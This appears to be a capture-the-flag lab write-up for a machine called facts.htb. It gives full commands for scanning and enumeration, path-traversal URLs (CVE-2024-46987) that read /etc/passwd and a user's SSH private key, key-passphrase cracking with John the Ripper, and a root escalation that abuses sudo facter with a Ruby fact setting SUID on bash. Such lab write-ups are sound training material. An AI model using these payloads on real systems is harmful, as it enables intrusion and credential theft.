## Reconnaissance

The initial phase focused on identifying exposed services on the target host. A full TCP port scan was performed using Nmap to discover all open ports.

```bash
nmap -p- --open -Pn 10.129.67.36 --stats-every=5s
```

This scan revealed three open ports:
- 22 (SSH)
- 80 (HTTP)
- 54321 (HTTP service running on a Golang server)

Further inspection of port 54321 showed that it redirects to port 9001, indicating the presence of an additional web service or proxy configuration.

## Enumeration

With HTTP services identified, the next step involved enumerating web content, including subdomains and directories.

### Subdomain Enumeration

Subdomain fuzzing was performed using `ffuf` with a well-known wordlist.

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ -u http://FUZZ.facts.htb -v
```

This technique attempts to discover hidden virtual hosts by brute-forcing subdomain names.

### Directory Enumeration

Directory brute-forcing was conducted using Gobuster.

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/big.txt
```

This revealed multiple directories, including an administrative panel.

During this phase, a cookie was identified but could not be decoded, suggesting it may be encrypted or signed.

Attempts were also made to exploit potential Local File Inclusion (LFI) and SQL injection vulnerabilities, though initial attempts were unsuccessful.

### Path Traversal Vulnerability

Research into known vulnerabilities affecting the identified CMS led to the discovery of a path traversal issue, **CVE-2024-46987**.

Exploitation of this vulnerability allowed arbitrary file reads via the following endpoint:

```
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

> CVE-2024-46987 is a path traversal vulnerability in a media download handler. The `file` parameter is not properly sanitized, allowing `../` sequences to escape the intended media directory and read arbitrary files on the host with the privileges of the web server.

This successfully retrieved the `/etc/passwd` file.

![/etc/passwd retrieved via the CVE-2024-46987 path traversal](/assets/images/facts/Pasted-image-20260202204557.png)
*/etc/passwd contents retrieved through the path traversal endpoint*

From this file, two valid users were identified: `william` and `trivia`.

Given that SSH access was available, the next objective was to retrieve private keys for lateral movement. The same path traversal vulnerability was leveraged to extract an SSH private key.

```
http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/id_ed25519
```

## Credential Access

The retrieved private key was password-protected. To crack the passphrase, it was first converted into a hash format compatible with John the Ripper.

```bash
ssh2john id_ed25519 > hash_enc
```

The hash was then cracked using a common wordlist.

```bash
john -w /usr/share/wordlists/rockyou.txt hash_enc --format=ssh
```

After successfully recovering the passphrase, SSH access was obtained as the user `trivia`.

![SSH access obtained as the user trivia](/assets/images/facts/Pasted-image-20260202212120.png)
*SSH session established as trivia using the cracked key*

### Privilege Escalation via Facter

`facter` is a system inventory tool that supports custom "facts" written in Ruby, loaded from a user-specified directory. Since `facter` executes these custom scripts as root when run with `sudo`, this behavior can be abused to execute arbitrary commands with elevated privileges.

A malicious Ruby script is created to set the SUID bit on `/bin/bash`.

```bash
cd /tmp/exploit/
```

```bash
echo 'Facter.add(:ouhboy_fact) do setcode { system("chmod +s /bin/bash") } end' > /tmp/exploit/root.rb
```

The script is then executed via `facter`.

```bash
sudo /usr/bin/facter --custom-dir=/tmp/exploit/ ouhboy_fact
```

> Allowing `sudo facter --custom-dir` to point to a user-writable directory effectively allows arbitrary Ruby code execution as root, since custom facts are loaded and evaluated by the `facter` process at runtime.

This results in a SUID-enabled bash binary, allowing privilege escalation to root.

Finally, root access is achieved and the root flag is obtained.
